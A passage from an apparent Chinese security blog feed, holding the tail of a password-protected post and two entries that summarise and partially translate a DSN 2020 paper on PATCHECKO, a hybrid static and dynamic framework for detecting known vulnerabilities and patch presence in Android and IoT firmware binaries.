b8f2cec649cb81cf29a2ce435cc768b6188e03d92bdb633b8d24b30369c61d8066fcc1231a48a25b743643c9383a20050f8c06a13d3047368fd4c079d9e3047a8642e4e28735b27b69e345fb35e72fad98ab7203d791331247f2adc07c4aca2bc17caaed8f81c15b0df7312fa87edca0948ef16a4c36dc293d95a537632c3c3eb8e2abd532fc913bffbcc6e0cde2134146d5062bd817728dce67c8f98b4bf448bebf4cf6b16c583bf2cb412f59d8c389e6b056eeb1fb6c22ce0ceaeae65538b784aa3502b7b29324bff77a160a1b30bea0e947ea70fb3e7db9f42d78341fd776502278704afdcd9ed614928e27c91699ed080403c75beabd911a3ee09c4f86ab1791c379061ac9cec9708253bd1e2bbbed25f13ffab7ef515076c58d18f422fc87a93cd5cb88f585ac7284e1eea3e403ee53876c5bfdc9c11e0e393e387c2e909007e285f626669da9b71f718d33164f3bf515b1813f774fd9b60c2a2919579afa9961f3b2ad8d28553349f57df697472c2cfdfe3d171bb451ef83f2c7825b25ac73c7e032352263becfbcedf4b35002659580635d53d04a851db61c240d92cb12396e1e53c383ede6ce54366f281a164d338b8251cc1728252476dc810fce6a774a975d209442597ab08583b4b49064355f8e02adce494181a1b36d8c50adf87c8304d4e1a0c94ccef28823a4fc806c16d3d934a2c87397127a65802ca80dc06cd2fef0b97cf96785cf371fe67585ebef4082b5b8cb6cefd688ddbfec4cc0fb197a0fe52f3b63affb3722e80958e0d1d16b7e2c09a931cb8c4fbbcd905995decf87cf5780932a7f259758c9f89650b5aa85bda30fc56caed7cc2365d9ae14c69869f977613f57f6b8c83262bc31b1ebacd18b6ee90d055be946f2b400c868f0</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">\'猜啥\'</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>Fr3v1带你读论文-Hybrid Firmware Analysis for Known Mobile and IoT Security Vulnerabilities</title>
    <url>/41992.html</url>
    <content><![CDATA[<blockquote>
<p>文章由本人首发于安全客：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjYwNDcx">Fr3v1带你读论文-Hybrid Firmware Analysis for Known Mobile and IoT Security Vulnerabilities - 安全客，安全资讯平台 (anquanke.com)<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly9pZWVleHBsb3JlLmllZWUub3JnL2Fic3RyYWN0L2RvY3VtZW50LzkxNTMzOTk=">Hybrid Firmware Analysis for Known Mobile and IoT Security Vulnerabilities<i class="fa fa-external-link-alt"></i></span>(<span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjU5MjQ2">针对移动和物联网设备已知漏洞的混合固件分析<i class="fa fa-external-link-alt"></i></span>)的太长不看版</p>
<span id="more"></span>
<h1>主要内容</h1>
<p>移动设备和物联网设备的操作系统以及它们随后的升级文件通常是以二进制文件的形式发布。由于这些二进制文件通常是闭源的，用户或第三方企业若是想测试软件的安全性只能依靠逆向工程，此外，如何验证二进制文件中最近的补丁是否有效也是一个悬而未决的问题。常规的软件补丁修复是提升移动设备和物联网设备安全性的重要保障，这就需要开发人员、集成商和供应商的共同支持，及时把补丁分发到受影响的所有设备上。但实际上，供应商们对移动和物联网产品遵循着不同，甚至是错误的安全更新议程。其次，以往的研究反映出存在着“潜在的补丁缺口(a hidden patch gap)”：有些供应商错误的声称他们已经修复了漏洞。因此，在二进制文件中检测漏洞是否被修复对于软件安全至关重要。以往对二进制文件中的漏洞检测大多基于静态的代码相似性分析，然而它无法捕捉程序的动态行为，因此可能产生大量误报且难以区分漏洞是否已经修复。<br>
在论文中，作者提出了一个针对可执行文件漏洞和补丁存在性检测的框架PATCHECKO。它混合了静态检测和动态检测方法，能够对X86和arm架构的二进制代码进行漏洞检测。作者的测试结果表明这个框架对漏洞检测和漏洞函数区分具有较高的准确率。</p>
<h1>设计与实现</h1>
<p>PATCHECKO的工作需要以下三个步骤：</p>
<ol>
<li>训练漏洞检测器</li>
<li>用漏洞检测器对固件进行静态分析</li>
<li>对2分析得出的可能含有漏洞的函数进行动态分析，验证漏洞是否存在并识别函数中的漏洞是否被修复</li>
</ol>
<p>工作过程如图：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210903221707.png" alt="workflow"></p>
<h2 id="0x1-漏洞静态检测器和静态分析">0x1  漏洞静态检测器和静态分析</h2>
<p>对于已知漏洞挖掘，深度学习方法的准确性和效率都明显优于过去的二分图匹配和动态相似性测试。PATCHECKO的漏洞检测器使用Keras和TensorFlow实现了神经网络的建模、训练和分类，使用TensorBoard来实现整个训练过程的可视化。</p>
<h3 id="Ⅰ-构建数据集">Ⅰ 构建数据集</h3>
<p>使用反汇编器（如IDA）的插件提取程序控制流图（CFG），并生成每个函数以及其基本块级的特征向量，每个特征向量包括48个特征，如下图：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210908213440.png" alt="feature-vector"></p>
<h3 id="Ⅱ-深度学习">Ⅱ 深度学习</h3>
<p>作者在采用了一个线性层堆叠的序贯模型。<br>
图3展示了一个用于深度学习模型的样本向量。样本向量由函数向量对和一个表示两个函数是否相似的比特组成，其中两个相似的特征向量对应着相同源代码的两个二进制函数。图4是该6层序列模型训练的实际过程，第一层接收输入张量的形状（input shape）的信息。这个模型使用了从数据集中提取的函数特征进行训练。<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210918220859.png" alt="fig-3"><br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210917223725.png" alt="fig-4"></p>
<h2 id="0x2-动态分析">0x2 动态分析</h2>
<p>动态分析的工作流程如图5：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210918220751.png" alt="fig-5"></p>
<p>该阶段使用相同的输入值执行两个函数，并比较两个函数的执行轨迹和其他特征的相似性。</p>
<h3 id="Ⅰ-动态分析引擎的输入数据">Ⅰ 动态分析引擎的输入数据</h3>
<p>作者使用Fuzz工具（在评估过程中选用了LibFuzzer）生成函数的多组输入数据，以完全覆盖CFG，并测试证明这些数据都能正常运行于漏洞函数和已修复漏洞的函数。接着使用这些数据来测试每个候选函数，筛去执行过程中崩溃的函数。<br>
随后PATCHECKO将剩下函数作为可执行文件导出，在后续动态分析中使用DLL注入进行执行</p>
<h3 id="Ⅱ-插桩测试">Ⅱ 插桩测试</h3>
<p>作者使用了gdbserver和debugserver对函数执行进行跟踪和特征提取，提取的特征包括指令的数量和类型、系统调用的次数和类型，以及库函数调用和堆栈数据读写量等，具体在表Ⅱ中展示：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210919143257.png" alt="tab-2"></p>
<p>对于每个输入执行时，动态分析引擎会对每个特征会生成一组观察结果。当该函数里的所有指令都被覆盖到后，PATCHECKO会根据所有结果生成一个单独的向量。这个过程会在每次对函数进行不同输入时重复。</p>
<h3 id="Ⅲ-计算函数语义相似度">Ⅲ 计算函数语义相似度</h3>
<p>对于每个函数对(f,g)，PATCHECKO基于它们的动态特征向量距离计算出语义相似度。对于每个函数的特征向量，PATCHECKO使用了闵氏距离(Minkowski Distance)作为测量相似度的方法，在评估过程中，作者把p设为3。闵氏距离公式的一般式如下：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210919171915.png" alt="minkowski"><br>
在这个公式中，f代表了CVE函数，g代表目标固件中的候选函数，k指的是用到了第k个执行环境，x和y分别代表f和g的动态特征向量，此时P设为3。</p>
<p>每个函数相似度的最终结果为所有执行环境中得到相似距离的平均值，相似度计算方程如下（k为执行环境编号）：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210919180346.png" alt="sim-algorithm"></p>
<h3 id="Ⅳ-补丁检测">Ⅳ 补丁检测</h3>
<p>PATCHECKO使用了一个差分引擎来收集静态和动态相似性的检测结果，以此判断漏洞是否被修复。<br>
对于给定的漏洞函数f<sub>v</sub>、已修复函数f<sub>p</sub>和目标函数f<sub>t</sub>，差分引擎会首先生成三个值：f<sub>v</sub>、f<sub>p</sub>和f<sub>t</sub>的静态特征、sim<sub>v</sub>与sim<sub>t</sub>、sim<sub>p</sub>与sim<sub>t</sub>的动态语义相似性得分以及S<sub>v</sub>和S<sub>p</sub>之间的差分特征（differential signatures）。静态特征即上述的48个不同的量化特征，动态语义相似度得分与上述的函数相似度指标。差分特征（differential signatures）是一个用于比较CFG结构的附加指标，即两个函数的CFG拓扑以及语义信息，例如函数参数、局部变量和库函数调用。</p>
<h1>评价</h1>
<h2 id="评估结果">评估结果</h2>
<p>对于模型训练数据集，作者使用Clang从Android-8.1.0_r36的源码中编译了100个库函数，每个库根据不同的目标平台（ x86, AMD64, ARM 32bit， ARM 64bit ISA）、优化级别（O0, O1, O2,O3, Oz, Ofast）生成了23个不同的二进制文件，总共获得了2108个库文件，包含了2037772个函数特征样本。其中1222663个函数用于模型训练，407554个函数用于校验，407555个函数用于下图的测试<br>
图8展示了在训练了大约15小时后，深度学习模型的准确率和损失，其中准确率可达到96%。<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master//blog/20211030090924.png" alt="fig-8"></p>
<p>作者对Android Things 1.0 和 Google Pixel 2 XL (Android 8.0) 的固件进行了评估。所用的漏洞函数数据集来自Android Security Bulletins，包括了从2016年7月到2018年11月的漏洞，涵盖2076个漏洞。检测结果表明，模型的静态检测平均准确率高于93%</p>
<p>对于动态分析输出的漏洞函数，除了深度学习阶段就被漏报的CVE-2017-13209外，PATCHECKO能将其余所有预期的目标函数输出到结果的前三位。<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master//blog/20211030090830.png" alt="dyn-result"></p>
<p>对于函数是否已修复的检测，PATCHECKO在25个CVE漏洞函数中只遗漏了CVE-2018-9470，该CVE的漏洞函数和修复函数仅差了一个整数。<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master//blog/20211030090706.png" alt="dyn-result-2"></p>
<h2 id="缺点">缺点</h2>
<ol>
<li>在静态检测时，PATCHECKO通过比较候选函数与已修复/未修复函数来检测是否为目标函数，这导致了可能会产生遗漏</li>
<li>检测漏洞是否已修复时，由于CFG表示的特征粒度不够细，可能会因为漏洞函数和已修复函数之间的差异非常微小，导致相似性检测可能无法捕捉到它们之间的差异。</li>
</ol>
<p>第二点或许可以通过应用/结合其他程序表示方法，如CDG、PDG等结构来进行优化。但如作者所说的，这样可能还需要进一步对方案通用性方面进行设计。</p>
]]></content>
  </entry>
  <entry>
    <title>针对移动和物联网设备已知漏洞的混合固件分析</title>
    <url>/60805.html</url>
    <content><![CDATA[<blockquote>
<p>文章由本人首发于安全客：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjU5MjQ2">针对移动和物联网设备已知漏洞的混合固件分析 - 安全客，安全资讯平台 (anquanke.com)<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<p>一篇DSN2020 的论文：<span class="exturl" data-url="aHR0cHM6Ly9pZWVleHBsb3JlLmllZWUub3JnL2Fic3RyYWN0L2RvY3VtZW50LzkxNTMzOTk=">Hybrid Firmware Analysis for Known Mobile and IoT Security Vulnerabilities<i class="fa fa-external-link-alt"></i></span>，太长不看版会在不久后发出。</p>
<span id="more"></span>
<h1>0x0 摘要</h1>
<p>移动设备和物联网设备的操作系统以及它们随后的升级文件，通常是以二进制文件的形式发布。由于这些二进制文件通常是闭源的，用户或第三方企业若是想测试软件的安全性只能依靠逆向工程，此外，如何验证二进制文件中最近的补丁是否有效也是一个悬而未决的问题。常规的软件补丁修复是提升移动设备和物联网设备安全性的重要保障，这就需要开发人员、集成商和供应商的共同支持，及时把补丁分发到受影响的所有设备上。但实际上，供应商们对移动和物联网产品遵循着不同，甚至是错误的安全更新议程。其次，以往的研究反映出存在着“潜在的补丁缺口(a hidden patch gap)”：有些供应商错误的声称他们已经修复了漏洞。因此，在二进制文件中检测漏洞是否被修复对于软件安全至关重要。通过深度学习的方法来判断代码相似性和进行漏洞检测已经被证明在静态二进制代码分析中极具前景，然而，这种方法无法捕捉程序动态行为，导致了可能在挖掘在野漏洞时产生大量误报。此外还有一点十分关键，静态的方法无法捕捉到用于区分漏洞是否修复所需的细粒度特征。</p>
<p>在本文中，我们提出了PATCHECKO，一个针对可执行文件的漏洞和补丁存在性检测框架。PATCHECKO依赖于混合跨平台二进制代码相似性分析，一种结合了基于深度学习的静态代码分析和动态分析的方法。它不需要访问二进制文件的源代码。我们在最新的Google Pixel 2 和 Android Things IoT 固件映像上评估了PATCHECKO的性能，其中有25个CVE漏洞已经被报告和修复了。结果表明我们的深度学习模型在漏洞检测上达到了93%的准确率。 在动态分析过程中，我们删减了深度学习阶段得到的候选函数（包括误报）。结果表明，PATCHECKO总能在候选函数中将正确的结果输出在结果排名的前三名之中。此外，它的差分引擎也以96%的准确率区分了漏洞函数和已修复漏洞的函数。</p>
<h1>Ⅰ.引言</h1>
<p>软件漏洞披露的数量和发现漏洞的速度每年都在稳步上升。2010年提交给CVE数据库的漏洞报告数量大约为4600篇，2016年为6500篇，随后在2017年翻了一番，超过了14700篇。与此同时，移动和物联网设备的日益普及使他们成为了漏洞研究和利用的首选目标，根据Gartner预测，到2020年全球将会有204亿台物联网设备。此外，消费者和企业在其产品或者活动中也常常直接使用供应商提供的固件和补丁。这些外部设备通常需要进行一些检查步骤，包括对产品软件的安全断言等，例如进行黑盒渗透测试。如果这类测试没有做好，就可能会导致IoT设备的安全问题。好在对于渗透测试人员来说，移动和物联网供应商通常重复使用开源代码并将其应用到他们的产品。渗透测试人员通常关注于加密函数库、媒体函数库和解析器等在漏洞被发现后定期更新的二进制文件，但不幸的是，移动和物联网设备中这些库的源代码不易被获得，导致它们很难及时被更新到最新版本。</p>
<p>通常来说，移动和物联网设备的补丁管理对于这种异质的生态系统来说是一种挑战。2018年，美国联邦贸易委员会（FTC）的一份报告显示，一个生态系统的多样性一方面为消费者提供了大量的选择，另一方面却增加了安全更新的复杂性和不一致性。软件补丁必须经过许多中间商，从开发者到集成商再到供应商，最后才被推送到终端设备上。</p>
<p>这种较长的补丁链产生了两个问题。首先，这种冗长的中间人名单会使得补丁不能被及时到终端。在2016年， Duo Labs team 发现仅有25%的移动设备运行了最新的补丁。其次，供应商并不总能准确地报告他们是否修复了某个漏洞（潜在的补丁缺口），特别是对于移动设备和物联网设备。一个研究表明，由供应商发布的80.4%的固件都包含了多个已知漏洞，许多最近发布的固件升级包中里用使用的第三方库也存在许多漏洞，有些漏洞甚至在八年前就被发现了。另一个针对安卓手机的研究发现，一些供应商通常会<em>忘记</em>将漏洞修复，使得（物联网）生态系统的某一部分暴露在潜在的风险中。<br>
这种补丁缺口不仅会导致大量设备易受攻击，同时，随着代码重用的普遍性增加，开发人员可能直接使用存在已知漏洞的代码，导致漏洞迅速传播。</p>
<p>因此，识别存在漏洞的二进制代码和修复情况对终端用户来说是一个严峻的挑战。PATCHECKO通过一个混合两个步骤的方法解决了这个问题，该方法结合了一个轻量的固件静态分析和紧随其后的准确的动态分析，以完善静态分析的结果。</p>
<p><strong>依赖深度学习进行的已知漏洞挖掘。</strong> 对于如何在给定的二进制文件中得到漏洞的集合-或者至少是超集，是一个已经被探索过的问题，但并没有令人满意的答案。最近，研究人员正在尝试通过跨平台的二进制代码相似性检查来检测已知漏洞。这类方案尝试识别目标固件中是否存在某个漏洞，其与漏洞函数数据库中的函数相似。他们直接从控制流图里代表函数的每个结点的二进制代码中提取健壮（robust）的、独立于平台的特征。除此之外，还有的方法侧重于二进制代码的相似性检测，其中使用了图匹配算法来检查两个函数的控制流图表达是否相似。另外，这类方法中可以使用深度学习中的自然语言处理来代替人工选择特征。</p>
<p>以往的研究表明深度学习方法可以用于在二进制代码分析中检测漏洞。最新的算法训练表现的模型评估指标达到0.971、检测准确率超过80%。然而，即便有这种较好的表现，假设目标二进制代码有3000+个函数，我们仍旧会得到大量（600+个）候选函数需要我们在自动分析后人工进行确认。同时，已有研究证明，在能够访问符号表的情况下，候选函数是可以被精简的。但是，对于没有符号表的商用现成品（COTS）二进制文件，这种方法只能从它们那得到一个庞大的候选函数集，且大多是误报。因此，需要进一步对候选函数进行删减，以确保只识别和报告出真正含有漏洞的函数。PATCHECKO使用了目标二进制代码的静态分析结果（静态特征）来完成这一阶段。</p>
<p><strong>通过动态分析对候选函数进行删减。</strong> PATCHECK依据动态分析的结果（动态特征）对基于深度学习的方法得到的候选函数集进行删减，以避免误报。静态分析阶段已经移除了大多数极不可能含有漏洞的函数，只返回了一小部分函数，这使得PATCHECKO可以在这些函数上使用更耗费资源的动态分析技术。以往的工作出于对可扩展性的考虑，将执行速度放在首位，而牺牲了准确性，仅关注了基本块和函数的启发式特征或静态特征。相比之下，PATCHECKO的混合方法不仅加快了漏洞函数匹配的速度，而且在删减误报后也提升了准确率。</p>
<p>这个初始框架让我们能够开发一种新的训练模型生成方法，该方法使用默认策略预训练了一个与任务无关的图嵌入网络。接着，对从相同源代码编译而来但编译优化级别和目标平台不同的二进制函数集使用了这种方法，生成了一个大规模的数据集。随后，我们构建了一个漏洞数据库，其中包含了1382个移动/物联网设备固件的漏洞。</p>
<p>然而，我们最终的目标不仅仅是找到CVE编号对应的函数，而是分辨出目标固件中是否存在有漏洞，亦或是已经被修复了。</p>
<p><strong>修复状态检测。</strong> 过去的研究已经发展出了准确的补丁存在性检测，然而这个方案仅在能够访问到待检测函数和已修复漏洞函数的源代码时才适用。同时，因为这个方案依赖于基于二进制相似性检测的方法来定位目标函数，这也可能导致之前提到过的对候选函数的大量误报。我们的方案直接操作于剥离符号表的商用二进制文件，且在不需要访问源代码的同时还能明显地减少误报。</p>
<p>最后，本文提出了PATCHECKO，一个结合了基于深度学习的二进制代码相似性检查和动态分析的框架，适用于挖掘已知漏洞和补丁存在性检测。根据我们的评估结果，PATCHECKO在准确性和效率方面都明显优于目前最先进的算法。</p>
<p><strong>贡献。</strong> 我们总结了我们做出的贡献如下：</p>
<ul>
<li>提出了一个高效的固件漏洞和补丁存在性检测框架。该框架利用了深度学习和动态二进制分析技术，在无需访问源代码的情况下，实现了对受限二进制固件的高准确率和高性能的已知漏洞挖掘。</li>
<li>提出了一个细粒度的二进制比较算法，能够准确的区分出同一函数的二进制代码的修复和未修复版本。我们的方案目前支持跨平台的ARM和X86架构。针对比较而选用的相关特征使得此方案能够以非常低的误报率，准确的定位未打补丁的函数。</li>
<li>我们用4种架构、100个安卓固件库、25个CVE漏洞来评估PATCHECKO的性能，结果表明它非常有希望在实际环境中进行得到应用。PATCHECKO的大部分原型都是完全自动化的，同时，它的动态分析模块可以准确的识别和删除深度学习阶段的误报。动态分析后，由另一个模块再对结果进行处理，将未打补丁的函数和已修复的函数区分开。</li>
</ul>
<h1>Ⅱ.概述</h1>
<p>我们在Ⅱ-A里介绍了函数相似性的问题和面临的挑战，在Ⅱ-B里展示了我们的解决方案。</p>
<h2 id="A-威胁模型和挑战">A.威胁模型和挑战</h2>
<p>在本文中，我们主要考虑在没有源代码的情况下寻找商用移动/物联网设备二进制文件中的已知漏洞。我们还假设二进制文件没有经过压缩或者混淆，且是由高级语言，即具有函数概念的语言编译而成的，因为在分析混淆过的代码时，有一个很重要的问题是如何对代码进行处理，而这超出了本文讨论的范围。基于以上这些假设，我们列出了在移动/物联网平台下面临的以下几个挑战。</p>
<p><strong>针对不同平台架构的大量二进制文件。</strong> 移动/物联网平台通常由各种不同架构的硬件组成，但它们可能拥有相同的软件漏洞。因此，我们特别考虑了，不同目标平台和优化级别对相同源代码产生的二进制程序这一情况。通过这种方式，我们可以生成不同硬件架构（例如x86和ARM）和软件平台（例如Windows、Linux和MacOS）下具有相同漏洞的二进制函数。<br>
<strong>大量的候选漏洞函数。</strong> 为了体现候选漏洞函数的数量级，我们分析了 Android Things 1.0 和 IOS 12.0.1 的固件。对于 Android Things 1.0 ，我们找到了379个不同的库，其中包含440532个函数；对于 IOS 12.0.1 ，我们找到了198个库，包含93714个函数。虽然过往的研究表明基于深度学习的方法可以用于高精度识别候选漏洞函数集，但这类技术并没有自动化的解决方案来对误报结果进行进一步删减。此外，“Precise and accurate patch presence test for binaries”研究中提出的方案依赖于符号表，但受限制的商用软件中并没有符号表可以使用，这就提出了另一个问题，即如何对没有符号表的二进制文件进行候选漏洞函数的删减。<br>
<strong>区分已修复代码和漏洞代码。</strong> 未修复函数和已修复函数可能并不容易区分，它们之间的差别可能小到只改变了一行代码。以往的研究表明，在能够访问含有漏洞的函数源码和修复过漏洞的函数源码的情况下，我们可以检测漏洞是否被修复，但大部分时候我们无法获得二进制函数的源码。</p>
<p>针对这些有趣的挑战，我们现在介绍一下PATCHECKO框架。</p>
<h2 id="B-方案">B.方案</h2>
<p>PATCHECKO框架的执行流程在图1进行了展示。我们的方案分为三个步骤进行：（1）用深度学习训练漏洞检测器，（2）用训练的漏洞检测器对目标移动/物联网固件进行静态分析，（3）对静态分析出可能含有漏洞的函数进行进一步的动态分析，验证漏洞是否存在，随后使用从漏洞函数和已修复漏洞函数中提取的静态和动态特征，识别候选漏洞函数是否已经被修复。<br>
PATCHECKO的目标是将二进制固件中的函数与CVE漏洞库以及相关的补丁进行对比，输出目标固件镜像中的漏洞函数以及对应的CVE编号。为了比较两个二进制函数运行时的特征，PATCHECKO结合了静态和动态分析技术以及人工智能和机器学习的深度学习方法。PATCHECKO先使用轻量级的静态分析模块将每个固件中的函数转换为用于机器学习的特征向量，接着调事先训练过的深度神经网络模型来判断两个（源代码相同但编译选项可能不同的）函数（一个来自固件，另一个来自CVE数据库）是否相似。如果两个函数检测结果表明可能相似，PATCHECKO就会进行更深入的动态分析，来确保静态分析的结果并不是误报。<br>
为了进行动态分析，PATCHECKO在对应的移动/物联网嵌入式系统平台内运行CVE漏洞函数和目标固件函数时，使用了DLL注入以及远程调试并给函数参数和全局变量赋了相同的值。它捕捉了两个函数的每个运行轨迹并提取动态特征，例如指令的数量和类型、系统调用的次数和类型，以及库函数调用和堆栈数据读写量等。<br>
基于提取出的这些特征，PATCHECKO算出两个函数的相似度并判断静态分析的结果是否是正确的。如果正确，PATCHECKO就认为这个该固件里的这个函数存在对应CVE编号，并在结果中报告该固件和对应的CVE编号。值得一提的是，PATCHECKO的分析过程不需要访问源代码，因此完全不需要固件供应商的支持。<br>
因为我们并不知道前一步输出的函数是否被修复过，PATCHECKO会先基于两个函数的静态特征对它们进行比较，然后再用已修复函数与目标函数进行比较，随后使用差分引擎对静态/动态特征和相似度进行分析，来判断函数中的漏洞是否被修复了。</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210903221707.png" alt="图1"></p>
<h1>Ⅲ. 设计</h1>
<p>在这一节中，我们将展示PATCHECKO框架的设计方案，包括它是如何处理移动/物联网二进制可执行文件、如何在无源代码的条件下发现并报告固件里代码段或数据段中的漏洞。在基于相似性检测的漏洞挖掘之外，PATCHECKO还能够准确识别目标固件是否打上了安全补丁。</p>
<h2 id="A-基于深度学习的固件漏洞评估">A.基于深度学习的固件漏洞评估</h2>
<p>对于已知漏洞挖掘，深度学习方法的准确性和效率都明显优于过去的二分图匹配和动态相似性测试。这是由于深度学习方法可以从整体上评估二进制文件的图像表示，而且可以在没有人为定义规则的情况下自主学习关系。PATCHECKO的第一步使用了一个深度学习框架，在短时间内生成了一个候选漏洞函数列表。为了符合之前的假设，我们首先需要提取静态静态函数特征，构建一个训练数据集，然后对深度学习模型进行训练。<br>
<strong>特征提取。</strong> 为了提取函数的静态特征，PATCHECKO首先分析了函数的汇编格式，标记了每个每个汇编例程正确的边界、范围。PATCHECKO的神经网络模型输入的数据是从目标函数的反编译代码中提取的函数特征向量。为了获得特征向量，我们先识别了函数的边界。在尽量不依赖指令集语义的情况下识别函数边界是一个有趣的问题，以往这个任务都由传统的机器学习或神经网络或函数接口验证来进行，在我们的设计中，这些方法都由反汇编器通过某种具有鲁棒性的启发式技术完成。反汇编器可以提供一个二进制文件的控制流图（CFG），一个在漏洞检测中常常使用的特征。<br>
图2表示了PATCHECKO的函数特征提取过程。PATCHECKO利用了具有不同基本块级属性的CFG作为特征来进行模拟。对于每个函数，PATCHECKO可以提取函数级、基本块级、块间级信息。表Ⅰ展示了生成一个特征向量用到的提取出的48个有趣的特征。<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210908215509.png" alt="图2"><br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210908213440.png" alt="表Ⅰ"><br>
PATCHECKO保证了提取特征的丰富（48个特征）、高效（自动提取）和可扩展性（支持多架构）<br>
<strong>训练深度学习模型。</strong> 对于PATCHECKO的深度学习，我们采用了一个由线性层堆叠的序贯模型，所有超参数都是凭经验确定的。图3展示了一个用于深度学习模型的样本向量。样本向量由函数向量对和一个表示两个函数是否相似的比特组成，其中两个相似的特征向量对应着相同源代码的两个二进制函数。图4描述了一个用6层网络模型训练的实际过程。我们首先为每一层指定了输入。顺序模型中的第一层需要接收输入张量的形状（input shape）的信息。这个模型使用了从我们数据集中提取的函数特征进行训练，该数据集包含了2108个具有不同架构的二进制文件。<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210918220859.png" alt="20210918220859"><br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210917223725.png" alt="20210917223725"></p>
<h2 id="B-通过深入的动态分析删去候选函数中的误报">B.通过深入的动态分析删去候选函数中的误报</h2>
<p>我们使用动态分析来进一步删减深度学习阶段返回的候选函数。本阶段判断了先前报告的函数对是否确实是相似的（例如，均为修复过或含有漏洞的函数）。在动态分析步骤进行时，程序用相同的输入值执行了两个候选函数，并比较了观察到的行为和其他几个特征的相似性。<br>
由于生成两个函数的编译选项可能不同，在这种情况下，对于相同的输入，两个函数的执行轨迹可能差别很大。因此，我们的分析将考虑执行轨迹的语义相似性，即两个函数输入相同数值后执行完毕对内存的影响。<br>
为了实现这个功能，我们从执行轨迹中提取了特征（动态特征）。我们的方法比较了两个具有相同输入值的函数所产生的两条执行轨迹的特征向量。如果对于不同的输入值，均观察到具有相似的特征，那么我们就猜测它们在语义上是相似的。<br>
图5展示了PATCHECKO动态分析的工作流程。真正要进行动态分析还有如下几个困难：首先，如何准备执行的环境；其次，如何同时监控多个候选函数的执行情况；另外，由于我们研究的是异构的移动/物联网生态系统，因此要运行所有的二进制代码来获得执行轨迹并不容易，特别是一些函数的执行需要“有效”的输入。我们先讨论输入动态分析引擎的准备工作。<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210918220751.png" alt="20210918220751"><br>
<strong>输入动态分析引擎的数据。</strong> 实现PATCHECKO动态分析引擎的一个关键问题是如何准备相关的输入。动态分析引擎需要两个输入内容：程序的二进制代码，我们称为** F** ，以及** F** 的运行环境。其中程序的二进制代码包括了目标函数** f** 。有一个难点是，如何将目标函数和整个二进制函数的执行区别开。一个方案是在执行时提供具体而有效的输入值，但因为无法引导操作系统在特定的地址开始执行程序，所以这个方案通常需要装载并运行整个程序。PATCHECKO提供一个包含了所需执行状态的执行环境，从而解决了这个问题。<br>
PATCHECKO使用模糊测试为不同目标函数生成不同的输入，来加快控制流图（CFG）的覆盖率。对于每次目标函数的执行，PATCHECKO都会导出一个压缩的函数级可执行文件，即一个压缩的、可通过运行时DLL注入执行的二进制文件和使其能够运行的相关输入。这使得动态分析执行引擎能够高效地执行目标函数，同时也意味着PATCHECKO可以针对不同目标函数使用特定执行环境和不同输入。<br>
<strong>验证候选函数的执行。</strong> 在PATCHECKO开始插桩检测目标函数前，它对众多的候选函数使用了多种的执行环境。在我们开始运行目标函数f后会有几个可能的结果，例如，函数f可能正常运行，可能产生了系统异常，或者进入死循环。如果候选函数f触发了一个系统异常，我们将从候选集里移除该函数。在使用多种执行环境验证各个函数执行后，将会对候选函数进行插桩。<br>
<strong>目标函数插桩检测。</strong> 在特定执行环境下，动态分析引擎对函数f的分析结果输出了一个长度为N的特征向量<em>v(f，env)</em>。为了生成该特征向量，PATCHECKO追踪了函数的执行。在动态分析时，通常有大量的工具可以使用，例如调试器、模拟器和虚拟机，但由于移动/物联网固件架构和平台的异构性，PATCHECKO因此选用了一个支持多种架构和平台的插桩工具。<br>
PATCHECKO提取了各种指令的指定特征，包括指令信息（例如指令数量）、系统级信息（例如内存访问）以及例如函数和系统调用的高级别特征。表Ⅱ展示了我们最初考虑并最终证明对建立函数二元相似性有用的初始特征集。当然这些特征并不并不全面，也很容易进一步扩展。<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210919143257.png" alt="20210919143257"><br>
对于每次执行，动态分析引擎会对每个特征会生成一组观察结果，例如，在上面的例子里会生成21组观察结果。当f里的所有指令都被覆盖到后，PATCHECKO把所有结果合并成一个单独的向量，例如f<sub>input_1</sub>。同样的过程会在每次对函数进行不同输入时重复，产生f<sub>input_2</sub>、f<sub>input_3</sub>、…、f<sub>input_N</sub>。<br>
现在我们能够提取目标函数的动态特征了，接下来介绍计算一对函数以及特征集之间相似性的算法。</p>
<h2 id="C-计算函数语义相似度">C.计算函数语义相似度</h2>
